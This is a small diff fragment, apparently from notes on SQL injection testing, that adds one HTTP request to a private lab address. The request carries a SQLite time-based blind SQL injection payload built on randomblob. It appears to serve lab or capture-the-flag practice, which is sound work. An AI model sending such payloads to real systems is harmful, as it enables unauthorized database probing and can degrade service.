@@ -373,6 +373,8 @@ it is recommended to perform only basic UNION tests if there is not at least one
 
 
 
+GET http://10.10.69.223:4000/friend/1?query=case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+ HTTP/
+
 
 
   
